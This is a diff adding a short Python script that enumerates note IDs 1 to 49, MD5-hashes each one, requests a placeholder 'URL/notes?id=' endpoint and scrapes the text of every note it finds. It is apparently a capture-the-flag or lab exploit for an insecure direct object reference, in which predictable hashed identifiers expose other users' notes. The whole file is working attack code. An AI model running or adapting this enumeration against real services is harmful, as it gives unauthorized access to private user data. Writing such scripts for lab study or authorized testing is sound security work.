@@ -1,0 +1,27 @@
+import requests
+import hashlib
+from bs4 import BeautifulSoup
+import re
+
+cookies = {"name":"value"}
+
+for id in range(1,50):
+
+    id_str = str(id)
+    hash_md5 = hashlib.md5(id_str.encode('utf-8'))
+    id_md5 = hash_md5.hexdigest()
+
+    
+    
+    url = f'http://URL/notes?id={id_md5}' 
+    print(url)
+    
+    r = requests.get(url)
+       
+    if r.status_code != 404:
+        soup = BeautifulSoup(r.content, 'html.parser')
+        element = soup.find('p', {'style': 'display: inline-block; width: 100%; min-height: 200px; padding: 8px; font-family: Arial, sans-serif;color: #082f49; font-size: 16px; line-height: 1.5em; overflow-y: auto;'})
+        text = element.text
+        text = re.sub(r'[^\w\s]', '', text) 
+                
+        print(text)
